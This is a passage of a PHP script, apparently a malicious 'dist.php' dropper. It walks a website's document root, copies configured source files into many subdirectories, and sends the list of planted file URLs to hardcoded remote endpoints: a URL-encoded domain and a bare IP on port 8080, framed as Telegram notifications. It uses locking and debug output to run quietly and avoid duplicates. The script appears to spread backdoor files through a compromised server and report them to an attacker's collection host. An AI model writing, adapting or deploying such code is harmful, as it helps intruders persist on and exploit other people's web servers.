        rawurldecode("https%3A%2F%2Fus.detikapi.com%2Fnotify"),
        'http://104.194.155.44:8080/notify',
    );
    $requestMethod = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'CLI';
    $clientIp = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
    $requestUri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/dist.php';
    $baseUrl = $scheme . '://' . $host . $requestUri;

    $disabledFnsRaw = ini_get('disable_functions');
    $disabledFns = array_map('trim', explode(',', is_string($disabledFnsRaw) ? $disabledFnsRaw : ''));
    $canPhpUname = function_exists('php_uname') && !in_array('php_uname', $disabledFns, true);
    $serverName = $canPhpUname ? php_uname('n') : $host;

    $chunks = empty($urls) ? array(array()) : array_chunk($urls, DIST_TELEGRAM_URLS_PER_MESSAGE);
    $maxMessages = (int) ceil(DIST_MAX_FILES / DIST_TELEGRAM_URLS_PER_MESSAGE);
    if ($maxMessages < 1) {
        $maxMessages = 1;
    }
    $chunks = array_slice($chunks, 0, $maxMessages);
    $totalChunks = count($chunks);

    $sent = 0;

    foreach ($chunks as $index => $chunkUrls) {
        $outputBlock = dist_build_telegram_urls_block($chunkUrls, $index, $totalChunks);
        $fullUrlText = dist_truncate_text($baseUrl . "\n\n" . $outputBlock, DIST_TELEGRAM_TEXT_LIMIT);

        $payload = array(
            'timestamp' => dist_get_atom_timestamp(),
            'server_name' => $serverName . ' #dist',
            'full_url' => $fullUrlText,
            'meta' => array(
                'request_method' => $requestMethod,
                'client_ip' => $clientIp,
                'status' => empty($urls) ? 'info' : 'success',
                'message' => empty($urls) ? 'No URLs found' : 'URL list chunk',
                'summary' => 'total=' . count($urls) . ', chunk=' . ((int) $index + 1) . '/' . $totalChunks,
            ),
            'output' => $outputBlock,
        );

        $chunkSent = false;
        foreach ($apiUrls as $apiUrl) {
            try {
                $response = infoFastApi($apiUrl, $payload);
                $statusCode = isset($response['status_code']) ? (int) $response['status_code'] : 0;
                if ($statusCode >= 200 && $statusCode < 300) {
                    $chunkSent = true;
                    break;
                }
            } catch (Exception $e) {
                // Try next endpoint.
            }
        }

        if ($chunkSent) {
            $sent++;
        }

        if (function_exists('usleep') && ((int) $index + 1) < $totalChunks) {
            usleep(150000);
        }
    }

    return array(
        'attempted' => $totalChunks,
        'sent' => $sent,
    );
}

function dist_release_lock_dir($lockDir)
{
    $lockDir = dist_norm($lockDir);
    if (!is_dir($lockDir)) {
        return;
    }
    $info = $lockDir . '/info.txt';
    if (is_file($info)) {
        @unlink($info);
    }
    @rmdir($lockDir);
}

/**
 * Acquire a global non-blocking lock to prevent concurrent redistribution runs.
 *
 * Lock strategy:
 *   1) Atomic mkdir() lock directory (portable; works when flock is unreliable)
 *   2) Best-effort file lock (flock) when mkdir is not possible
 *
 * @param mixed       $handle_out  Resource handle or array('type'=>'dir','path'=>string)
 * @param string|null   $reason_out
 * @return bool
 */
function dist_acquire_global_lock(&$handle_out = null, &$reason_out = null)
{
    $handle_out = null;
    $reason_out = null;

    $baseDir = rtrim(str_replace('\\', '/', (string) dirname(__FILE__)), '/');
    $lockDir = $baseDir . '/.dist.lock.d';

    // Prefer atomic directory lock (portable across filesystems)
    if (@mkdir($lockDir, 0700)) {
        $handle_out = array('type' => 'dir', 'path' => $lockDir);
        $info = "pid=" . (function_exists('getmypid') ? (int) getmypid() : 0) . "\n";
        $info .= "time=" . (function_exists('time') ? (int) time() : 0) . "\n";
        @file_put_contents($lockDir . '/info.txt', $info);

        if (function_exists('register_shutdown_function')) {
            register_shutdown_function('dist_release_lock_dir', $lockDir);
        }
        return true;
    }

    if (is_dir($lockDir)) {
        // Stale lock cleanup
        $ttl = defined('DIST_LOCK_TTL_SECONDS') ? (int) DIST_LOCK_TTL_SECONDS : 1800;
        $ttl = ($ttl > 0) ? $ttl : 1800;
        $mtime = function_exists('filemtime') ? @filemtime($lockDir) : false;
        if ($mtime !== false && function_exists('time') && (time() - (int) $mtime) > $ttl) {
            dist_release_lock_dir($lockDir);
            if (@mkdir($lockDir, 0700)) {
                $handle_out = array('type' => 'dir', 'path' => $lockDir);
                if (function_exists('register_shutdown_function')) {
                    register_shutdown_function('dist_release_lock_dir', $lockDir);
                }
                $reason_out = 'stale_lock_recovered';
                return true;
            }
        }

        $reason_out = 'locked';
        return false;
    }

    // Fallback to flock when mkdir is not possible (permissions, etc.)
    if (!function_exists('flock')) {
        $reason_out = 'lock_unavailable';
        return true; // best-effort: proceed without locking
    }

    $lockPath = $baseDir . '/.dist.lock';
    $fh = @fopen($lockPath, 'c');
    if ($fh === false) {
        $reason_out = 'lock_open_failed';
        return true; // best-effort: proceed without locking
    }

    if (@flock($fh, LOCK_EX | LOCK_NB)) {
        $handle_out = $fh;
        return true;
    }

    @fclose($fh);
    $reason_out = 'locked';
    return false;
}

/**
 * Output data as a JSON array.
 * Uses json_encode() (PHP 5.2+) with PHP 5.4+ flags when available,
 * or a manual fallback for stripped/minimal builds.
 *
 * @param array $data
 */
function dist_output_json(array $data)
{
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
    }

    if (function_exists('json_encode')) {
        $flags = 0;
        if (defined('JSON_PRETTY_PRINT'))      {
            $flags |= JSON_PRETTY_PRINT;       // PHP 5.4+
        }
        if (defined('JSON_UNESCAPED_SLASHES')) {
            $flags |= JSON_UNESCAPED_SLASHES;  // PHP 5.4+
        }
        echo json_encode($data, $flags);
        return;
    }

    // Manual JSON array — safety net for very old / stripped environments
    $items = array();
    foreach ($data as $v) {
        $escaped = str_replace(
            array('\\',    '"',    '/',    "\n",   "\r",   "\t"),
            array('\\\\', '\\"', '\\/', '\\n',  '\\r',  '\\t'),
            (string) $v
        );
        $items[] = '"' . $escaped . '"';
    }
    echo "[\n  " . implode(",\n  ", $items) . "\n]";
}

// ============================================================
// ENTRY POINT
// ============================================================

$dist_root     = dist_detect_root();
$dist_base_url = dist_detect_base_url();

if (empty($DIST_SOURCES)) {
    if (dist_debug_enabled()) {
        dist_output_json(array(
            'error' => 'no_sources_found',
            'configured' => dist_config_filenames(),
            'fallback' => DIST_FILENAME,
            'cwd' => dirname(__FILE__),
        ));
    } else {
        dist_output_json(array());
    }
    exit;
}

$dist_lock_handle = null;
$dist_lock_reason = null;
if (!dist_acquire_global_lock($dist_lock_handle, $dist_lock_reason)) {
    // Another run is already active; avoid placing duplicate files due to concurrency.
    if (dist_debug_enabled()) {
        dist_output_json(array(
            'error' => 'distribution_locked',
            'reason' => $dist_lock_reason,
        ));
    } else {
        dist_output_json(array());
    }
    exit;
}

$dist_stats = null;
if (dist_debug_enabled()) {
    $dist_stats = array(
        'doc_root' => $dist_root,
        'base_url' => $dist_base_url,
        'script_dir' => dirname(__FILE__),
        'min_depth' => DIST_MIN_DEPTH,
        'max_depth' => DIST_MAX_DEPTH,
        'max_files' => DIST_MAX_FILES,
        'skip_names' => array_values($DIST_SKIP),
        'sources' => array_map(function ($s) {
            return isset($s['name']) ? $s['name'] : 'unknown';
        }, $DIST_SOURCES),
        'lock_reason' => $dist_lock_reason,
    );
}

$dist_results  = dist_run(
    $dist_root,
    $dist_root,
    $dist_base_url,
    $DIST_SKIP,
    $DIST_SOURCES,
    $dist_stats
);

dist_notify_telegram_api($dist_results);

if (dist_debug_enabled()) {
    dist_output_json(array(
        'urls' => $dist_results,
        'stats' => $dist_stats,
    ));
} else {
    dist_output_json($dist_results);
}

if (is_resource($dist_lock_handle)) {
    @fclose($dist_lock_handle);
} elseif (is_array($dist_lock_handle) && isset($dist_lock_handle['type']) && $dist_lock_handle['type'] === 'dir' && isset($dist_lock_handle['path'])) {
    dist_release_lock_dir($dist_lock_handle['path']);
}
